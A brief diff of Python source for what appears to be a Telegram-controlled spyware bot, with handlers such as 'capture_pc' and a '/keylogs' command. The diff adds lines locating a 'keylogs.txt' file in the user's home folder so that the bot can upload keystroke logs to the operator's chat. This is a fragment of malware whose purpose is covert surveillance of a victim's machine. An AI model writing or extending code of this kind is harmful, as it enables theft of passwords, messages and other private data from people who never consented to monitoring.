@@ -143,6 +143,8 @@ def capture_pc(message):
         bot.send_message(chat_id, error_message)
 @bot.message_handler(commands=['keylogs'])
 def keylogs(message):
+    user_folder = os.path.expanduser('~')
+    log_file = os.path.join(user_folder, 'keylogs.txt')
     chat_id = message.chat.id
     bot.send_chat_action(chat_id, 'upload_document')
     try:
